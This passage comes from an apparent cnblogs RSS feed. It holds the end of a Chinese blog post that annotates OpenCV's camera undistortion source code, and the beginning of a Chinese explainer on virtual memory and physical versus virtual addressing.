            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;畸变模型求出theta_d，相当于有畸变的角度值&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; theta2 = theta*theta, theta4 = theta2*theta2, theta6 = theta4*theta2, theta8 = theta4*&lt;span&gt;theta4;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; theta_d = theta * (&lt;span&gt;1&lt;/span&gt; + k[&lt;span&gt;0&lt;/span&gt;]*theta2 + k[&lt;span&gt;1&lt;/span&gt;]*theta4 + k[&lt;span&gt;2&lt;/span&gt;]*theta6 + k[&lt;span&gt;3&lt;/span&gt;]*&lt;span&gt;theta8);
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用有畸变的Theta值，将摄像机坐标系下的归一化三维坐标，重投影到二维图像平面，得到(j,i)对应畸变图像中的(u,v)&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; scale = (r == &lt;span&gt;0&lt;/span&gt;) ? &lt;span&gt;1.0&lt;/span&gt; : theta_d /&lt;span&gt; r;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; u = f[&lt;span&gt;0&lt;/span&gt;]*x*scale + c[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;];
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; v = f[&lt;span&gt;1&lt;/span&gt;]*y*scale + c[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存(u,v)坐标到mapx,mapy&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_16SC2 )
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iu = cv::saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(u*&lt;span&gt;cv::INTER_TAB_SIZE);
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iv = cv::saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(v*&lt;span&gt;cv::INTER_TAB_SIZE);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;0&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iu &amp;gt;&amp;gt;&lt;span&gt; cv::INTER_BITS);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;1&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iv &amp;gt;&amp;gt;&lt;span&gt; cv::INTER_BITS);
                m2[j] &lt;/span&gt;= (&lt;span&gt;ushort&lt;/span&gt;)((iv &amp;amp; (cv::INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;))*cv::INTER_TAB_SIZE + (iu &amp;amp; (cv::INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)));
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_32FC1 )
            {
                m1f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)u;
                m2f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)v;
            }

            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这三条语句是上面 ”&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;二维图像平面坐标系-&amp;gt;摄像机坐标系“的一部分，是矩阵iR的第一列，这样写能够简化计算&lt;/span&gt;
            _x += iR(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
            _y &lt;/span&gt;+= iR(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
            _w &lt;/span&gt;+= iR(&lt;span&gt;2&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;2.普通相机模型的畸变校正&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 同样建议参考OpenCV官方文档阅读代码 &lt;a href=&quot;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html#&quot; target=&quot;_blank&quot;&gt;https://docs.opencv.org/3.0-beta/modules/calib3d/doc/camera_calibration_and_3d_reconstruction.html# &lt;/a&gt;&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;主要流程和上面Fisheye模型差不多，只有第4部分的畸变模型不一样，普通相机的畸变模型如下：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://images2017.cnblogs.com/blog/1138496/201711/1138496-20171109224247825-208685899.png&quot; alt=&quot;&quot; width=&quot;740&quot; height=&quot;500&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; 同样把源代码贴上，并加上注解：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;101&quot;&gt;
&lt;pre&gt;
#include &amp;lt;opencv2\opencv.hpp&amp;gt;

&lt;span&gt;void&lt;/span&gt;&lt;span&gt; cv::initUndistortRectifyMap( InputArray _cameraMatrix, InputArray _distCoeffs,
                              InputArray _matR, InputArray _newCameraMatrix,
                              Size size, &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; m1type, OutputArray _map1, OutputArray _map2 )
{
    Mat cameraMatrix &lt;/span&gt;= _cameraMatrix.getMat(), distCoeffs =&lt;span&gt; _distCoeffs.getMat();
    Mat matR &lt;/span&gt;= _matR.getMat(), newCameraMatrix =&lt;span&gt; _newCameraMatrix.getMat();

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( m1type &amp;lt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt; )
        m1type &lt;/span&gt;=&lt;span&gt; CV_16SC2;
    CV_Assert( m1type &lt;/span&gt;== CV_16SC2 || m1type == CV_32FC1 || m1type ==&lt;span&gt; CV_32FC2 );
    _map1.create( size, m1type );
    Mat map1 &lt;/span&gt;=&lt;span&gt; _map1.getMat(), map2;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( m1type !=&lt;span&gt; CV_32FC2 )
    {
        _map2.create( size, m1type &lt;/span&gt;== CV_16SC2 ?&lt;span&gt; CV_16UC1 : CV_32FC1 );
        map2 &lt;/span&gt;=&lt;span&gt; _map2.getMat();
    }
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        _map2.release();

    Mat_&lt;/span&gt;&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt; R = Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;::eye(&lt;span&gt;3&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;);
    Mat_&lt;/span&gt;&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt; A = Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(cameraMatrix), Ar;

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( !&lt;span&gt;newCameraMatrix.empty() )
        Ar &lt;/span&gt;= Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(newCameraMatrix);
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        Ar &lt;/span&gt;= getDefaultNewCameraMatrix( A, size, &lt;span&gt;true&lt;/span&gt;&lt;span&gt; );

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( !&lt;span&gt;matR.empty() )
        R &lt;/span&gt;= Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(matR);

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( !&lt;span&gt;distCoeffs.empty() )
        distCoeffs &lt;/span&gt;= Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;(distCoeffs);
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
    {
        distCoeffs.create(&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;, CV_64F);
        distCoeffs &lt;/span&gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    }

    CV_Assert( A.size() &lt;/span&gt;== Size(&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;) &amp;amp;&amp;amp; A.size() ==&lt;span&gt; R.size() );
    CV_Assert( Ar.size() &lt;/span&gt;== Size(&lt;span&gt;3&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;) || Ar.size() == Size(&lt;span&gt;4&lt;/span&gt;, &lt;span&gt;3&lt;/span&gt;&lt;span&gt;));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;LU分解求新的内参矩阵Ar与旋转矩阵R乘积的逆矩阵iR&lt;/span&gt;
    Mat_&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt; iR = (Ar.colRange(&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;3&lt;/span&gt;)*&lt;span&gt;R).inv(DECOMP_LU);
    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;* ir = &amp;amp;iR(&lt;span&gt;0&lt;/span&gt;,&lt;span&gt;0&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;从旧的内参矩阵中取出光心位置u0,v0,和归一化焦距fx,fy&lt;/span&gt;
    &lt;span&gt;double&lt;/span&gt; u0 = A(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;),  v0 = A(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; fx = A(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;0&lt;/span&gt;),  fy = A(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;尼玛14个畸变系数，不过大多用到的只有(k1,k2,p1,p2)，最多加一个k3，用不到的置为0&lt;/span&gt;
    CV_Assert( distCoeffs.size() == Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;4&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;4&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;5&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;5&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;8&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;8&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;12&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;12&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;) ||&lt;span&gt;
               distCoeffs.size() &lt;/span&gt;== Size(&lt;span&gt;1&lt;/span&gt;, &lt;span&gt;14&lt;/span&gt;) || distCoeffs.size() == Size(&lt;span&gt;14&lt;/span&gt;, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;));

    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;( distCoeffs.rows != &lt;span&gt;1&lt;/span&gt; &amp;amp;&amp;amp; !&lt;span&gt;distCoeffs.isContinuous() )
        distCoeffs &lt;/span&gt;=&lt;span&gt; distCoeffs.t();

    &lt;/span&gt;&lt;span&gt;const&lt;/span&gt; &lt;span&gt;double&lt;/span&gt;* &lt;span&gt;const&lt;/span&gt; distPtr = distCoeffs.ptr&amp;lt;&lt;span&gt;double&lt;/span&gt;&amp;gt;&lt;span&gt;();
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k1 = distPtr[&lt;span&gt;0&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k2 = distPtr[&lt;span&gt;1&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; p1 = distPtr[&lt;span&gt;2&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; p2 = distPtr[&lt;span&gt;3&lt;/span&gt;&lt;span&gt;];
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k3 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;5&lt;/span&gt; ? distPtr[&lt;span&gt;4&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k4 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;8&lt;/span&gt; ? distPtr[&lt;span&gt;5&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k5 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;8&lt;/span&gt; ? distPtr[&lt;span&gt;6&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; k6 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;8&lt;/span&gt; ? distPtr[&lt;span&gt;7&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s1 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;8&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s2 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;9&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s3 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;10&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; s4 = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;12&lt;/span&gt; ? distPtr[&lt;span&gt;11&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; tauX = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;14&lt;/span&gt; ? distPtr[&lt;span&gt;12&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;
    &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; tauY = distCoeffs.cols + distCoeffs.rows - &lt;span&gt;1&lt;/span&gt; &amp;gt;= &lt;span&gt;14&lt;/span&gt; ? distPtr[&lt;span&gt;13&lt;/span&gt;] : &lt;span&gt;0&lt;/span&gt;&lt;span&gt;.;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;tauX,tauY这个是什么梯形畸变，用不到的话matTilt为单位阵
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Matrix for trapezoidal distortion of tilted image sensor&lt;/span&gt;
    cv::Matx33d matTilt =&lt;span&gt; cv::Matx33d::eye();
    cv::detail::computeTiltProjectionMatrix(tauX, tauY, &lt;/span&gt;&amp;amp;&lt;span&gt;matTilt);

    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; i = &lt;span&gt;0&lt;/span&gt;; i &amp;lt; size.height; i++&lt;span&gt; )
    {
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m1f = map1.ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;float&lt;/span&gt;* m2f = map2.empty() ? &lt;span&gt;0&lt;/span&gt; : map2.ptr&amp;lt;&lt;span&gt;float&lt;/span&gt;&amp;gt;&lt;span&gt;(i);
        &lt;/span&gt;&lt;span&gt;short&lt;/span&gt;* m1 = (&lt;span&gt;short&lt;/span&gt;*&lt;span&gt;)m1f;
        &lt;/span&gt;&lt;span&gt;ushort&lt;/span&gt;* m2 = (&lt;span&gt;ushort&lt;/span&gt;*&lt;span&gt;)m2f;

        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;利用逆矩阵iR将二维图像坐标(j,i)转换到摄像机坐标系(_x,_y,_w)&lt;/span&gt;
        &lt;span&gt;double&lt;/span&gt; _x = i*ir[&lt;span&gt;1&lt;/span&gt;] + ir[&lt;span&gt;2&lt;/span&gt;], _y = i*ir[&lt;span&gt;4&lt;/span&gt;] + ir[&lt;span&gt;5&lt;/span&gt;], _w = i*ir[&lt;span&gt;7&lt;/span&gt;] + ir[&lt;span&gt;8&lt;/span&gt;&lt;span&gt;];

        &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;( &lt;span&gt;int&lt;/span&gt; j = &lt;span&gt;0&lt;/span&gt;; j &amp;lt; size.width; j++, _x += ir[&lt;span&gt;0&lt;/span&gt;], _y += ir[&lt;span&gt;3&lt;/span&gt;], _w += ir[&lt;span&gt;6&lt;/span&gt;&lt;span&gt;] )
        {
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;摄像机坐标系归一化，令Z=1平面&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; w = &lt;span&gt;1&lt;/span&gt;./_w, x = _x*w, y = _y*&lt;span&gt;w;
             &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这一部分请看OpenCV官方文档，畸变模型部分&lt;/span&gt;
            &lt;span&gt;double&lt;/span&gt; x2 = x*x, y2 = y*&lt;span&gt;y;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; r2 = x2 + y2, _2xy = &lt;span&gt;2&lt;/span&gt;*x*&lt;span&gt;y;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; kr = (&lt;span&gt;1&lt;/span&gt; + ((k3*r2 + k2)*r2 + k1)*r2)/(&lt;span&gt;1&lt;/span&gt; + ((k6*r2 + k5)*r2 + k4)*&lt;span&gt;r2);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; xd = (x*kr + p1*_2xy + p2*(r2 + &lt;span&gt;2&lt;/span&gt;*x2) + s1*r2+s2*r2*&lt;span&gt;r2);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; yd = (y*kr + p1*(r2 + &lt;span&gt;2&lt;/span&gt;*y2) + p2*_2xy + s3*r2+s4*r2*&lt;span&gt;r2);
           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据求取的xd,yd将三维坐标重投影到二维畸变图像坐标(u,v)&lt;/span&gt;
            cv::Vec3d vecTilt = matTilt*cv::Vec3d(xd, yd, &lt;span&gt;1&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; invProj = vecTilt(&lt;span&gt;2&lt;/span&gt;) ? &lt;span&gt;1&lt;/span&gt;./vecTilt(&lt;span&gt;2&lt;/span&gt;) : &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; u = fx*invProj*vecTilt(&lt;span&gt;0&lt;/span&gt;) +&lt;span&gt; u0;
            &lt;/span&gt;&lt;span&gt;double&lt;/span&gt; v = fy*invProj*vecTilt(&lt;span&gt;1&lt;/span&gt;) +&lt;span&gt; v0;
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;保存u,v的值到Mapx,Mapy中&lt;/span&gt;
            &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_16SC2 )
            {
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iu = saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(u*&lt;span&gt;INTER_TAB_SIZE);
                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; iv = saturate_cast&amp;lt;&lt;span&gt;int&lt;/span&gt;&amp;gt;(v*&lt;span&gt;INTER_TAB_SIZE);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iu &amp;gt;&amp;gt;&lt;span&gt; INTER_BITS);
                m1[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;1&lt;/span&gt;] = (&lt;span&gt;short&lt;/span&gt;)(iv &amp;gt;&amp;gt;&lt;span&gt; INTER_BITS);
                m2[j] &lt;/span&gt;= (&lt;span&gt;ushort&lt;/span&gt;)((iv &amp;amp; (INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;))*INTER_TAB_SIZE + (iu &amp;amp; (INTER_TAB_SIZE-&lt;span&gt;1&lt;/span&gt;&lt;span&gt;)));
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt;( m1type ==&lt;span&gt; CV_32FC1 )
            {
                m1f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)u;
                m2f[j] &lt;/span&gt;= (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)v;
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                m1f[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;] = (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)u;
                m1f[j&lt;/span&gt;*&lt;span&gt;2&lt;/span&gt;+&lt;span&gt;1&lt;/span&gt;] = (&lt;span&gt;float&lt;/span&gt;&lt;span&gt;)v;
            }
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; 如有错误，望不吝赐教！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;另附上CUDA实现两种畸变校正方法的代码，放在我的码云上：&lt;a href=&quot;https://gitee.com/rxdj/camera-calibration.git&quot; target=&quot;_blank&quot;&gt;https://gitee.com/rxdj/camera-calibration.git&lt;/a&gt;。见cudaUndistort中的两个.cu文件&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 09 Nov 2017 14:49:00 +0000</pubDate>
<dc:creator>一棹烟波</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/riddick/p/7811877.html</dc:identifier>
</item>
<item>
<title>什么是内存(二)：虚拟内存 - eleven_yw</title>
<link>http://www.cnblogs.com/yaoxiaowen/p/7805964.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yaoxiaowen/p/7805964.html</guid>
<description>&lt;p&gt;通过上一篇文章的扯淡，我们应该已经明白了存储器的层次结构，技术细节很复杂，但是思想却不难理解，因为就是很简单的缓存思想。那么本文我们开始讨论关于内存的另一个话题.&lt;strong&gt;虚拟内存&lt;/strong&gt;。其实思想也是很容易理解的。&lt;/p&gt;
&lt;p&gt;我不知道有多少人听过虚拟内存这个概念，但是虚拟内存是计算机系统最重要的概念之一，并且它成功的主要原因就是它一直在沉默的，自动的工作，换句话说，我们这些做应用的程序员根本不需要干涉它的工作过程，但是一个没追求的码农不是好的搬砖民工，所以作为一个有理想有抱负的程序员，我们还是要去理解&lt;strong&gt;虚拟内存&lt;/strong&gt;，甚至可以这样说，如果不理解虚拟内存，你根本不可能理解程序的深层次运行原理。也不可能去理解汇编器，链接器，加载器，共享对象，文件和进程等概念。&lt;/p&gt;
&lt;p&gt;上篇文章中提出了几个让大家思考的问题:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;不管什么程序，最后的直接/间接的编译结果都是0和1，(我们直接理解为汇编)。(这点不知道的，欢迎阅读我的另一篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7470460.html&quot;&gt;关于跨平台的一些认识&lt;/a&gt;)，比如这句汇编代码：&lt;code&gt;mov eax,0x123456;&lt;/code&gt;它的意思是将内存&lt;code&gt;0x123456&lt;/code&gt;处的内容送往&lt;code&gt;eax&lt;/code&gt;这个寄存器。各个应用的数据共同存在内存中的。假设有一个音乐播放器应用的汇编代码中，引用了&lt;code&gt;0x123456&lt;/code&gt;这个内存地址。但是同时运行的应用有很多，那其他应用也完全有可能引用 &lt;code&gt;0x123456&lt;/code&gt;这个地址。那为什么竟然没起冲突和错误呢？&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;进程是计算机领域最重要的概念之一，什么是进程？进程是关于某次数据集合的一次运行活动， 是运行在它自己地址空间的一段自包容程序， 解释的通俗的点， 一个程序在运行时，我们会得到一个假象，该进程好像是独占地使用CPU和内存，CPU是没有间断地一条接一条的执行该程序的指令，所有的内存空间都是供该进程的代码和数据分配使用的。(这点不严谨，其实内存还有一部分要分给&lt;code&gt;内核kernel&lt;/code&gt;)。说起来，这个程序就好像得到了全世界一样。，CPU是我的，内存也全部我的，妹子们还是我的。当然这是假象而已。但是这些假象又是怎么做到的呢？&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;程序中都会引用库API，比如每个C程序都要引用&lt;code&gt;stdio.h&lt;/code&gt;库的&lt;code&gt;printf()&lt;/code&gt;，在程序运行时，库代码也要被加入到内存，这么多程序都引用了这个库，难道我内存中需要加很多份吗？这自然不可能，那么库代码又是怎么被所有进程共享的呢？&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;这些让我们细思恐极的疑问，都将通过这篇文章来给大家解答。&lt;/p&gt;
&lt;h2 id=&quot;物理和虚拟寻址&quot;&gt;物理和虚拟寻址&lt;/h2&gt;
&lt;p&gt;在访问者看来，主存就是一个有M个字节大小的单元组成的数组，每字节都有一个唯一的物理地址(Physical Address, PA)。 它的访问地址和数组一样，第一个地址为0，后面地址依次为&lt;code&gt;1,2,3-----M-2, M-1&lt;/code&gt;;这叫做线性地址空间。这种自然的访问内存的方式我们称之为&lt;strong&gt;物理寻址(physical addressing)&lt;/strong&gt;。&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：在访问内存时，&lt;strong&gt;对于任意一个地址，(不管是第0个还是第M-1个)，访问该地址的时间总是相同的&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;在各种数据结构中，我们都说hash表是最快的，比红黑树之类的都要快，那hash表为什么最快？那是因为hash表内部本质上是使用了数组。所以还是数组最快，那数组为什么最快？这是因为我们知道数组的起始地址以及某个元素的序号，就可以得到该元素在内存中的地址，而对于内存，访问任意一个地址，访问时间总是相同的。而类似链表，树等结构，却只能靠遍历了。(不过好的hash算法还是很难设计的，这是另外一个话题了)。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/918357/201711/918357-20171108185317825-1204338566.jpg&quot; alt=&quot;一个使用物理寻址的系统_10.jpg-34.4kB&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图10：一个使用物理寻址的系统&lt;/p&gt;
&lt;p&gt;上图是一个物理寻址的示例，这是一条加载指令，它读取从物理地址4开始的4个字节，CPU通过内存总线，将指令和地址传递给主存，主存读取从物理地址4处开始的4个字节，返回给CPU。&lt;/p&gt;
&lt;blockquote readability=&quot;7.8355795148248&quot;&gt;
&lt;p&gt;因为这篇文章主要讨论 虚拟内存，是关于L4级主存和磁盘之间的交互问题，为行文方便，文章中有时候直接说内存代指主存。所以这些不要误以为是指L1，L2之类的缓存。如果看不懂这段话啥意思，务必看看我的上一篇文章&lt;a href=&quot;http://www.cnblogs.com/yaoxiaowen/p/7805661.html&quot;&gt;什么是内存（一）：存储器层次结构&lt;/a&gt;,然后再来看这篇文章。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;早期计算机使用物理寻址方式，但是到了现在的多任务计算机时代，普遍使用的是&lt;strong&gt;虚拟寻址(virtual addressing)&lt;/strong&gt;。如下图所示：&lt;/p&gt;
